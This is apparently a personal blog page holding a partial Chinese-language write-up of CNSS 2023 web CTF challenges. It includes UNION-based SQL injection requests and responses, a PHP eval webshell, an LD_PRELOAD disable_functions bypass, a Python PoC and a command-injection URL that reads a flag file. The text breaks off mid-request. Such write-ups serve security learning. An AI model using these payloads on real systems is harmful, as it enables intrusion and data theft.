@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="[Easy] CNSS Database 1.0数字型-无过滤-直接爆 12345678910111213POST &#x2F;query.php HTTP&#x2F;1.1Host: 124.221.34.13:50015Content-Length: 100User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CNSS_2023_Summer_Web_WriteUp_Partial">
+<meta property="og:url" content="http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/index.html">
+<meta property="og:site_name" content="psych&#39;s blog">
+<meta property="og:description" content="[Easy] CNSS Database 1.0数字型-无过滤-直接爆 12345678910111213POST &#x2F;query.php HTTP&#x2F;1.1Host: 124.221.34.13:50015Content-Length: 100User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5ede9c6f-6cf5-435e-86ca-b20834ede5af/Untitled.png">
+<meta property="article:published_time" content="2023-09-16T12:27:57.000Z">
+<meta property="article:modified_time" content="2023-09-17T06:38:55.613Z">
+<meta property="article:author" content="psych">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5ede9c6f-6cf5-435e-86ca-b20834ede5af/Untitled.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CNSS_2023_Summer_Web_WriteUp_Partial</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/09/03/node-js/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&text=CNSS_2023_Summer_Web_WriteUp_Partial"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&title=CNSS_2023_Summer_Web_WriteUp_Partial"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&is_video=false&description=CNSS_2023_Summer_Web_WriteUp_Partial"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CNSS_2023_Summer_Web_WriteUp_Partial&body=Check out this article: http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&title=CNSS_2023_Summer_Web_WriteUp_Partial"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&title=CNSS_2023_Summer_Web_WriteUp_Partial"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&title=CNSS_2023_Summer_Web_WriteUp_Partial"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&title=CNSS_2023_Summer_Web_WriteUp_Partial"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&name=CNSS_2023_Summer_Web_WriteUp_Partial&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&t=CNSS_2023_Summer_Web_WriteUp_Partial"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-CNSS-Database-1-0"><span class="toc-number">1.</span> <span class="toc-text">[Easy] CNSS Database 1.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mid-Backdoor-%E2%85%A1"><span class="toc-number">2.</span> <span class="toc-text">[Mid] Backdoor Ⅱ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MID-Backdoor-%E2%85%A2"><span class="toc-number">3.</span> <span class="toc-text">[MID] Backdoor Ⅲ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">3.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">3.3.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-SignIn"><span class="toc-number">4.</span> <span class="toc-text">[Baby]SignIn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-Backdoor-1"><span class="toc-number">5.</span> <span class="toc-text">[Baby]Backdoor 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-Webpack"><span class="toc-number">6.</span> <span class="toc-text">[Baby] Webpack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-Leak"><span class="toc-number">7.</span> <span class="toc-text">[Easy] Leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-ezhttp"><span class="toc-number">8.</span> <span class="toc-text">[Easy] ezhttp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-CNSS-Feedback-Pre-alpha"><span class="toc-number">9.</span> <span class="toc-text">[Easy] CNSS Feedback Pre-alpha</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mid-ezunserialize"><span class="toc-number">10.</span> <span class="toc-text">[Mid]ezunserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mid-CNSS-Database-2-0"><span class="toc-number">11.</span> <span class="toc-text">[Mid] CNSS Database 2.0</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CNSS_2023_Summer_Web_WriteUp_Partial
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">psych</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-09-16T12:27:57.000Z" class="dt-published" itemprop="datePublished">2023-09-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Easy-CNSS-Database-1-0"><a href="#Easy-CNSS-Database-1-0" class="headerlink" title="[Easy] CNSS Database 1.0"></a>[Easy] CNSS Database 1.0</h2><p>数字型-无过滤-直接爆</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /query.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">124.221</span><span class="number">.34</span><span class="number">.13</span>:<span class="number">50015</span></span><br><span class="line">Content-Length: <span class="number">100</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">105.0</span><span class="number">.5195</span><span class="number">.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-<span class="built_in">type</span>: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://<span class="number">124.221</span><span class="number">.34</span><span class="number">.13</span>:<span class="number">50015</span></span><br><span class="line">Referer: http://<span class="number">124.221</span><span class="number">.34</span><span class="number">.13</span>:<span class="number">50015</span>/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">kw=<span class="number">0</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,table_name+<span class="keyword">from</span>+information_schema.tables+where+table_schema=<span class="string">&#x27;cnss&#x27;</span>limit+<span class="number">1</span>,<span class="number">1</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Wed, <span class="number">30</span> Aug <span class="number">2023</span> <span class="number">11</span>:<span class="number">36</span>:<span class="number">54</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.4</span><span class="number">.54</span> (Debian)</span><br><span class="line">X-Powered-By: PHP/<span class="number">8.0</span><span class="number">.22</span></span><br><span class="line">Content-Length: <span class="number">121</span></span><br><span class="line">Connection: close</span><br><span class="line">Content-<span class="type">Type</span>: application/json; charset=utf-<span class="number">8</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;success&quot;</span>,<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;0&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;2&quot;</span>:<span class="string">&quot;wh3re_1s_fl4g&quot;</span>,<span class="string">&quot;address&quot;</span>:<span class="string">&quot;wh3re_1s_fl4g&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>数据库：cnss，表：wh3re_1s_fl4g</p>
+<p>继续：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /query.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">124.221</span><span class="number">.34</span><span class="number">.13</span>:<span class="number">50015</span></span><br><span class="line">Content-Length: <span class="number">134</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">105.0</span><span class="number">.5195</span><span class="number">.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-<span class="built_in">type</span>: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://<span class="number">124.221</span><span class="number">.34</span><span class="number">.13</span>:<span class="number">50015</span></span><br><span class="line">Referer: http://<span class="number">124.221</span><span class="number">.34</span><span class="number">.13</span>:<span class="number">50015</span>/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">kw=<span class="number">0</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,column_name+<span class="keyword">from</span>+information_schema.columns+where+table_schema=<span class="string">&#x27;cnss&#x27;</span>+<span class="keyword">and</span>+table_name=<span class="string">&#x27;wh3re_1s_fl4g&#x27;</span>+limit+<span class="number">0</span>,<span class="number">1</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>列名：fulage</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /query.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">124.221</span><span class="number">.34</span><span class="number">.13</span>:<span class="number">50015</span></span><br><span class="line">Content-Length: <span class="number">49</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">105.0</span><span class="number">.5195</span><span class="number">.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-<span class="built_in">type</span>: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://<span class="number">124.221</span><span class="number">.34</span><span class="number">.13</span>:<span class="number">50015</span></span><br><span class="line">Referer: http://<span class="number">124.221</span><span class="number">.34</span><span class="number">.13</span>:<span class="number">50015</span>/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">kw=<span class="number">0</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,fulage+<span class="keyword">from</span>+wh3re_1s_fl4g;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>最终</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Wed, <span class="number">30</span> Aug <span class="number">2023</span> <span class="number">11</span>:<span class="number">40</span>:<span class="number">47</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.4</span><span class="number">.54</span> (Debian)</span><br><span class="line">X-Powered-By: PHP/<span class="number">8.0</span><span class="number">.22</span></span><br><span class="line">Content-Length: <span class="number">159</span></span><br><span class="line">Connection: close</span><br><span class="line">Content-<span class="type">Type</span>: application/json; charset=utf-<span class="number">8</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;success&quot;</span>,<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;0&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;2&quot;</span>:<span class="string">&quot;cnss&#123;w0w_y0u_kn0w_sql_inj3ct10n&#125;&quot;</span>,<span class="string">&quot;address&quot;</span>:<span class="string">&quot;cnss&#123;w0w_y0u_kn0w_sql_inj3ct10n&#125;&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Mid-Backdoor-Ⅱ"><a href="#Mid-Backdoor-Ⅱ" class="headerlink" title="[Mid] Backdoor Ⅱ"></a>[Mid] Backdoor Ⅱ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;RCE_ME&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>题目很简单，一句话木马</p>
+<p>但是发现除了phpinfo，其他系统命令都被ban了，查看phpinfo，发现<code>disable_function</code>把几乎所有的系统命令执行函数都禁用了。。</p>
+<p>网上搜了一下，大概考点应该是disable_function绕过，网上给的脚本大多是先通过蚁剑连接再上传so文件进行绕过。但是查看了一下网站根目录，发现一个<code>.antproxy.php</code>,问了hurrison说是反制蚁剑连接的。</p>
+<p>也就是说没办法蚁剑连接。查看权限，发现只有<code>/var/www/html</code> 是0755权限没有写文件权限，而其他路径都是0的权限，这道题势必要getshell执行系统命令才行了。</p>
+<p>所以思路就是想办法上传文件，<strong>利用 LD_PRELOAD 环境变量</strong>来执行系统命令。</p>
+<ul>
+<li>执行<code>print_r(glob(&#39;/*&#39;));</code> 发现<code>/tmp</code>目录，进入里面还有其他选手留下的脚本（</li>
+<li>所以思路是向<code>/tmp</code>目录下面写文件，利用文件包含getshell</li>
+</ul>
+<p>参考 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/263540.html">https://www.freebuf.com/articles/network/263540.html</a></p>
+<p>原理：</p>
+<blockquote>
+<p>利用漏洞控制 web 启动新进程 a.bin（即便进程名无法让我随意指定），新进程 a.bin 内部调用系统函数 b()，b() 位于 系统共享对象 c.so 中，所以系统为该进程加载共享对象 <a target="_blank" rel="noopener" href="http://c.so/">c.so</a>，想办法在加载 c.so 前优先加载可控的 c_evil.so，c_evil.so 内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内的b() 而非系统的 <a target="_blank" rel="noopener" href="http://c.so/">c.so</a> 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。</p>
+</blockquote>
+<p>想要利用LD_PRELOAD环境变量绕过disable_functions需要注意以下几点：</p>
+<blockquote>
+<p>能够上传自己的.so文件</p>
+<p>能够控制LD_PRELOAD环境变量的值，比如putenv()函数</p>
+<p>因为新进程启动将加载LD_PRELOAD中的.so文件，所以要存在可以控制PHP启动外部程序的函数并能执行，比如mail()、imap_mail()、mb_send_mail()和error_log()函数等</p>
+</blockquote>
+<p>——本题满足条件——</p>
+<p>利用大佬的exp：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+<p>本题不能连接蚁剑，需要手动上传文件到&#x2F;tmp</p>
+<ul>
+<li>问了问GPT，可以先把so文件进行base64编码，上传之后再解码，保存在<code>/tmp</code></li>
+<li>由于这个题已经有人上传了，直接美美利用</li>
+<li>根目录有一个flag还有一个readflag，其中flag没有权限打开，readflag貌似只一个程序</li>
+<li>执行<code>/readflag</code> 就可以获得flag内容了。</li>
+</ul>
+<hr>
+<p>总结</p>
+<ul>
+<li>LD_PRELOAD环境变量</li>
+<li>so文件</li>
+</ul>
+<h2 id="MID-Backdoor-Ⅲ"><a href="#MID-Backdoor-Ⅲ" class="headerlink" title="[MID] Backdoor Ⅲ"></a>[MID] Backdoor Ⅲ</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./d0or.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>d0or.php的内容是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`sh <span class="comment">/*p/p*`</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
+<li>根据题意，这个题的d0or.php就是一个后门文件</li>
+<li>而index.php可以把这个后门的内容输出出来，如果后门内容是‘ls &#x2F;‘</li>
+<li>那么我们上传文件之后，先保存在tmp目录下，也就是&#x2F;tmp&#x2F;phpxxxx</li>
+<li>然后d0or.php的内容，刚好就变成了：<code>. /tmp/phpxxxx</code></li>
+<li>其中的<code>.</code> 表示执行命令，并且不需要权限，就直接执行了，结果保存在d0or.php中，没回显</li>
+<li>但是直接在index.php中输出这个内容</li>
+</ul>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://43.248.187.181:9087/d0or.php&#x27;</span></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> : <span class="string">&#x27;/readflag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>理解一下关于bash命令执行的一些知识点，主要是那句：<code>其中的. 表示执行命令，并且不需要权限</code></p>
+<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5ede9c6f-6cf5-435e-86ca-b20834ede5af/Untitled.png" alt="Untitled"></p>
+<p>  简单来说， <code>.</code> 和<code>sh</code>差不多</p>
+<hr>
+<p>之前的题：</p>
+<h2 id="Baby-SignIn"><a href="#Baby-SignIn" class="headerlink" title="[Baby]SignIn"></a>[Baby]SignIn</h2><p>考点：html属性，开发者工具</p>
+<h2 id="Baby-Backdoor-1"><a href="#Baby-Backdoor-1" class="headerlink" title="[Baby]Backdoor 1"></a>[Baby]Backdoor 1</h2><p>考点：php ,命令执行，post和get</p>
+<h2 id="Baby-Webpack"><a href="#Baby-Webpack" class="headerlink" title="[Baby] Webpack"></a>[Baby] Webpack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install --<span class="keyword">global</span> reverse-sourcemap</span><br><span class="line"></span><br><span class="line">reverse-sourcemap ./main.c91fb7d1.js.<span class="built_in">map</span></span><br><span class="line"></span><br><span class="line">app.py里的注释</span><br></pre></td></tr></table></figure>
+
+<h2 id="Easy-Leak"><a href="#Easy-Leak" class="headerlink" title="[Easy] Leak"></a>[Easy] Leak</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">访问.index.php.swp   直接记事本打开</span><br><span class="line">http://<span class="number">124.221</span><span class="number">.34</span><span class="number">.13</span>:<span class="number">50004</span>/?cnss@30fc5b20a309996f3ab12662e3c4ac932c08db7f=system(%27cat%<span class="number">20</span>/fl4444444g%<span class="number">27</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="Easy-ezhttp"><a href="#Easy-ezhttp" class="headerlink" title="[Easy] ezhttp"></a>[Easy] ezhttp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">CNSS /Index HTTP/<span class="number">1.1</span></span><br><span class="line">Host: uestc.edu.cn</span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Linux; Android <span class="number">10</span>; SEA-AL10 Build/HUAWEISEA-AL10; wv) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Version/<span class="number">4.0</span> Chrome/<span class="number">86.0</span><span class="number">.4240</span><span class="number">.99</span> XWEB/<span class="number">4313</span> MMWEBSDK/<span class="number">20220805</span> Mobile Safari/<span class="number">537.36</span> MMWEBID/<span class="number">9538</span> MicroMessenger/<span class="number">8.0</span><span class="number">.27</span><span class="number">.2220</span>(<span class="number">0x28001B53</span>) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64</span><br><span class="line">Referer: cnss.io</span><br><span class="line">X-Forwarded-For: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.9</span></span><br><span class="line">Accept-Encoding: gzip, 